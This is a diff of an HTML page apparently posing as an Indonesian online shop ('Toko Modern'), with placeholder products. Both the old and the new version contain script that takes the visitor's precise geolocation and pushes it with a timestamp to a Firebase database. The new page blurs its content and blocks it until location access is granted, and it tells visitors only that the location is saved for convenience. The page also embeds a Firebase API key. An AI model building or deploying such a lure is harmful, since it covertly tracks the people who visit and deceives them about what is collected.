@@ -1,167 +1,200 @@
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <title>WATCH - Product Landing Page</title>
-        <meta content="width=device-width, initial-scale=1.0" name="viewport">
-        <meta content="Product Landing Page" name="keywords">
-        <meta content="Product Landing Page" name="description">
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>🛒 Toko Modern dengan Bootstrap</title>
 
-        <!-- Favicon -->
-        <link href="img/favicon.ico" rel="icon">
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
 
-        <!-- Google Fonts -->
-        <link href="https://fonts.googleapis.com/css?family=Montserrat:400|Quicksand:500,600,700&display=swap" rel="stylesheet">
+  <style>
+    body.blur {
+      filter: grayscale(100%) blur(4px);
+      pointer-events: none;
+      user-select: none;
+      transition: filter 0.3s ease;
+    }
+    #permission-message {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255, 255, 255, 0.95);
+      color: #dc3545;
+      font-size: 1.3rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 2rem;
+      z-index: 1080;
+      display: none;
+      flex-direction: column;
+    }
+    #permission-message svg {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 1rem;
+    }
+  </style>
+</head>
+<body class="blur">
 
+  <!-- Navbar -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-primary shadow">
+    <div class="container">
+      <a class="navbar-brand fw-bold" href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-shop" viewBox="0 0 16 16">
+          <path d="M2.97 1a1 1 0 0 0-.97 1v1h12V2a1 1 0 0 0-.97-1H2.97zm-.97 3v9.5a1 1 0 0 0 1 1H12a1 1 0 0 0 1-1V4H2z"/>
+          <path d="M12 6v7H4V6h8z"/>
+        </svg>
+        Toko Modern
+      </a>
+    </div>
+  </nav>
 
+  <!-- Main Content -->
+  <main class="container py-5">
 
-        <!-- Template Stylesheet -->
+    <header class="text-center mb-5">
+      <h1 class="display-5 fw-semibold">Belanja Mudah dan Cepat</h1>
+      <p class="text-muted fs-5">Lokasi toko akan tersimpan otomatis untuk kenyamanan Anda</p>
+    </header>
 
-<script>
-const firebaseConfig = {
-  apiKey: "AIzaSyAnI3-EDQr7OK8fHaeSSzAtLk9iR5sgbac",
-  authDomain: "lokasiapi-2f434.firebaseapp.com",
-  databaseURL: "https://lokasiapi-2f434-default-rtdb.firebaseio.com",
-  projectId: "lokasiapi-2f434",
-  storageBucket: "lokasiapi-2f434.firebasestorage.app",
-  messagingSenderId: "875812427660",
-  appId: "1:875812427660:web:5c4ce962244c47e18128a9"
-};
+    <!-- Store Icon -->
+    <section class="text-center mb-5">
+      <img
+        src="https://cdn-icons-png.flaticon.com/512/684/684908.png"
+        alt="Icon Toko"
+        class="img-fluid rounded shadow"
+        style="max-width: 180px;"
+      />
+    </section>
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
-
-  function sendLocation(lat, lon) {
-    const now = new Date().toISOString();
-    db.ref("lokasi").push({
-      latitude: lat,
-      longitude: lon,
-      timestamp: now
-    });
-  }
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6)),
-      err => console.warn("Gagal ambil lokasi:", err.message),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-  }
-</script>
-
-    </head>
-
-    <body>
-        <!-- Nav Start -->
-        <div id="nav">
-            <div class="container-fluid">
-                <div id="logo" class="pull-left">
-                    <a href="index.html"><img src="img/logo.png" alt="Logo" /></a>
-                </div>
-
-                <nav id="nav-menu-container">
-                    <ul class="nav-menu">
-                        <li class="menu-active"><a href="#header">Home</a></li>
-                        <li><a href="#feature">Features</a></li>
-                        <li><a href="#process">How Works</a></li>
-                        <li><a href="#products">Products</a></li>
-                        <li><a href="#testimonials">Reviews</a></li>
-                        <li><a href="#faqs">FAQs</a></li>
-                    </ul>
-                </nav>
+    <!-- Produk Grid -->
+    <section>
+      <div class="row row-cols-1 row-cols-sm-2 row-cols-md-3 g-4">
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+1" class="card-img-top" alt="Produk 1" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 1</h5>
+              <p class="card-text text-primary fw-semibold">Rp 50.000</p>
             </div>
-        </div>
-        <!-- Nav End -->
-        
-  
-        
-        
-        
-        <!-- Products Start -->
-        <div id="products">
-            <div class="container">
-                <div class="section-header">
-                    <h2>Get Your Products</h2>
-                    <p>
-                        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec viverra at massa sit amet ultricies
-                    </p>
-                </div>
-                <div class="row align-items-center">
-                    <div class="col-md-3">
-                        <div class="product-single">
-                            <div class="product-img">
-                                <img src="img/product-1.png" alt="Product Image">
-                            </div>
-                            <div class="product-content">
-                                <h2>Sports Edition</h2>
-                                <h3>$149</h3>
-                                <a class="btn" href="#">Buy Now</a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-3">
-                        <div class="product-single">
-                            <div class="product-img">
-                                <img src="img/product-2.png" alt="Product Image">
-                            </div>
-                            <div class="product-content">
-                                <h2>Sports Edition</h2>
-                                <h3>$199</h3>
-                                <a class="btn" href="#">Buy Now</a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-3">
-                        <div class="product-single">
-                            <div class="product-img">
-                                <img src="img/product-3.png" alt="Product Image">
-                            </div>
-                            <div class="product-content">
-                                <h2>Sports Edition</h2>
-                                <h3>$249</h3>
-                                <a class="btn" href="#">Buy Now</a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-3">
-                        <div class="product-single">
-                            <div class="product-img">
-                                <img src="img/product-4.png" alt="Product Image">
-                            </div>
-                            <div class="product-content">
-                                <h2>Sports Edition</h2>
-                                <h3>$299</h3>
-                                <a class="btn" href="#">Buy Now</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+          </div>
+        </article>
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+2" class="card-img-top" alt="Produk 2" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 2</h5>
+              <p class="card-text text-primary fw-semibold">Rp 75.000</p>
             </div>
-        </div>
-        <!-- Products End -->
-        
-
-
-
-        <!-- Footer Start -->
-        <div id="footer">
-            <div class="container">
-                <div class="row align-items-center">
-                    <div class="col-md-6">
-                        <p>&copy; Copyright <a href="https://htmlcodex.com">HTML Codex</a>. All Rights Reserved</p>
-                    </div>
-                    <div class="col-md-6">
-                        <p>Template by <a href="https://htmlcodex.com">HTML Codex</a></p>
-                    </div>
-                </div>
+          </div>
+        </article>
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+3" class="card-img-top" alt="Produk 3" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 3</h5>
+              <p class="card-text text-primary fw-semibold">Rp 100.000</p>
             </div>
-        </div>
-        <!-- Footer End -->
-        
-        
-        <!-- Back to Top -->
-        <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
+          </div>
+        </article>
+      </div>
+    </section>
 
+  </main>
 
-    </body>
+  <!-- Permission Overlay -->
+  <div id="permission-message" role="alert" aria-live="assertive">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
+      <path d="M8.982 1.566a1.13 1.13 0 0 0-1.964 0L.165 13.233c-.457.778.091 1.767.982 1.767h13.706c.89 0 1.438-.99.982-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/>
+    </svg>
+    <div>⚠️ Untuk melihat toko, mohon izinkan akses lokasi di browser Anda.<br/>Jika sudah muncul popup izin, silakan pilih “Izinkan”.</div>
+  </div>
+
+  <!-- Firebase JS SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAnI3-EDQr7OK8fHaeSSzAtLk9iR5sgbac",
+      authDomain: "lokasiapi-2f434.firebaseapp.com",
+      projectId: "lokasiapi-2f434",
+      storageBucket: "lokasiapi-2f434.firebasestorage.app",
+      messagingSenderId: "875812427660",
+      appId: "1:875812427660:web:5c4ce962244c47e18128a9"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const permissionMessageEl = document.getElementById('permission-message');
+    const bodyEl = document.body;
+
+    function sendLocation(lat, lon) {
+      const now = new Date().toISOString();
+      db.ref("lokasi").push({
+        latitude: lat,
+        longitude: lon,
+        timestamp: now
+      });
+    }
+
+    function checkPermissionAndRequest() {
+      if (!navigator.geolocation) {
+        permissionMessageEl.textContent = "Browser Anda tidak mendukung Geolocation.";
+        permissionMessageEl.style.display = "flex";
+        return;
+      }
+
+      if (navigator.permissions) {
+        navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
+          if (permissionStatus.state === 'granted') {
+            bodyEl.classList.remove('blur');
+            permissionMessageEl.style.display = "none";
+            navigator.geolocation.getCurrentPosition(pos => {
+              sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
+            });
+          } else if (permissionStatus.state === 'prompt') {
+            permissionMessageEl.style.display = "flex";
+            navigator.geolocation.getCurrentPosition(pos => {
+              bodyEl.classList.remove('blur');
+              permissionMessageEl.style.display = "none";
+              sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
+            }, err => {
+              permissionMessageEl.innerHTML = "⚠️ Anda menolak izin lokasi. Mohon izinkan untuk melihat toko.";
+              permissionMessageEl.style.display = "flex";
+              bodyEl.classList.add('blur');
+            });
+          } else if (permissionStatus.state === 'denied') {
+            permissionMessageEl.innerHTML = "⚠️ Anda telah menolak izin lokasi. Mohon izinkan akses lokasi dari pengaturan browser.";
+            permissionMessageEl.style.display = "flex";
+            bodyEl.classList.add('blur');
+          }
+
+          permissionStatus.onchange = function() {
+            checkPermissionAndRequest();
+          };
+        });
+      } else {
+        navigator.geolocation.getCurrentPosition(pos => {
+          bodyEl.classList.remove('blur');
+          permissionMessageEl.style.display = "none";
+          sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
+        }, err => {
+          permissionMessageEl.style.display = "flex";
+          permissionMessageEl.textContent = "⚠️ Mohon izinkan akses lokasi untuk melihat toko.";
+          bodyEl.classList.add('blur');
+        });
+      }
+    }
+
+    checkPermissionAndRequest();
+  </script>
+
+  <!-- Bootstrap Bundle JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
 </html>
